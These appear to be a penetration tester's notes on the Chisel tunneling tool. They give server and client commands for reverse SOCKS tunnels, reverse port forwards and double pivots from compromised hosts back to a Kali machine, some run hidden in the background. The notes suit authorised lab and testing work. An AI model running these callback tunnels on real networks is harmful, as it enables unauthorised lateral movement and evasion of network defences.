> A HTTP tunneling tool that encapsulates our data stream within HTTP. It also uses the SSH protocol within the tunnel so our data will be encrypted.

References:
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html


# Download

Download latest release
```
https://github.com/jpillora/chisel/releases
https://github.com/jpillora/chisel/releases/tag/v1.7.7
https://github.com/jpillora/chisel/releases/tag/v1.8.1
```

Copying the `chisel` binary to the `apache2` server folder
```bash
sudo cp $(which chisel) /var/www/html/
```

# SOCKS Tunnel

#HTTP_Tunneling #HTTP #SOCKS #Tunneling

## Chisel Server

Starting the reverse `chisel` server on port 8080
```bash
./chisel server --port 8080 --reverse
```
- `server` 
	- start the binary as a server with the `server` subcommand
- `--port 8080`
	- bind port 8080
- `--reverse`
	-  Allow the reverse port forward

## Chisel Client

### Linux

`chisel` client command (Linux) (Reverse Dynamic SOCKS)
```bash
/tmp/chisel client 192.168.101.169:8080 R:socks > /dev/null 2>&1 &
```
- `192.168.101.169:8080`
	- Connect to the Chisel server running on our Kali machine
- `R:socks`
	- Creating a reverse SOCKS tunnel
	- `R` prefix specifies a reverse tunnel using a `socks` proxy
		- SOCKS Proxy is bound to port `1080` by default
- `> /dev/null 2>&1 &`
	- Shell redirections force the process to run in the background, which will free up our shell

### Windows

`chisel` client command (Windows) (Reverse Dynamic SOCKS)
```powershell
.\chisel.exe client 192.168.45.138:8080 R:socks
```

### SOCKS Tunnel with port forward

Utilizing `chisel` to set up a reverse port forwarding to port 80 on an internal machine
```powershell
.\chisel.exe client 192.168.45.225:8080 R::172.16.54.169:
```

### Two way Chisel setup

Utilizing `chisel` to set up a reverse dynamic SOCKS tunnel and port forwarding
```powershell
.\chisel.exe client 192.168.45.173:8080 R:socks 10.10.84.141:79:127.0.0.1:6969
```
```
.\chisel.exe client [server_ip]:[server_port] [local_internal_ip]:[local_internal_port]:[server_local_ip]:[server_local_port]
```
- `192.168.45.173:8080`
	- Server IP and Port
- `10.10.84.141:79`
	- The current machine IP and Port
- `127.0.0.1:6969`
	- Local IP and Port at the Server
- Scenario
	- Kali <- Intermediary <- Internal
	- This allows Internal machine to use the chisel setup to talk to Kali 
		- E.g., Kali's webserver at port 6969 because of `127.0.0.1:6969` by talking to the intermediary machine at port 79 because of `10.10.84.141:79`
			- Using something like this `wget -Uri http://10.10.84.141:79/somefile.txt -OutFile somefile.txt`

Utilizing `chisel` to set up a reverse dynamic SOCKS tunnel and two port forwards
```powershell
.\chisel.exe client 192.168.45.204:8080 R:socks 10.10.80.147:7777:127.0.0.1:7777 10.10.80.147:8888:127.0.0.1:8888
```

## Double Pivot

Start the reverse `chisel` server on port 8080 on your Kali
```
./chisel server --port 8080 --reverse
```

Navigate to the first host that resides on both external and internal network
Utilize `chisel` to set up a reverse dynamic SOCKS tunnel
```powershell
.\chisel.exe client 192.168.70.123:8080 R:socks
```

Start the reverse `chisel` server on port 9090 on the first host
```bash
.\chisel.exe server --port 9090 --reverse
```

Navigate to the second host that resides on the current internal network and the second internal network
Utilize `chisel` to set up a reverse dynamic SOCKS tunnel
```
.\chisel.exe client 10.10.69.150:9090 R:2080:socks
```

Edit `proxychains4.conf`
```
sudo nano /etc/proxychains4.conf
```
```
socks5  127.0.0.1 1080
socks5  127.0.0.1 2080
```

# Port forward

#Port_Forwarding 

## Local Port Forward
> Forwarding opened ports on target, back to the server

Starting the reverse `chisel` server on port 8080
```bash
./chisel server --port 8080 --reverse
```

`chisel` client command (Windows)
```powershell
.\chisel.exe client 192.168.45.181:8080 R:[Kali_Port]:127.0.0.1:[Victim_Port]
```

## Remote Port Forward
> Opening and forwarding ports on target, back to the server

Starting the reverse `chisel` server on port 8080
```bash
./chisel server --port 8080 --reverse
```

`chisel` client command (Windows)
```powershell
.\chisel.exe client 192.168.45.181:8080 445:127.0.0.1:445
```
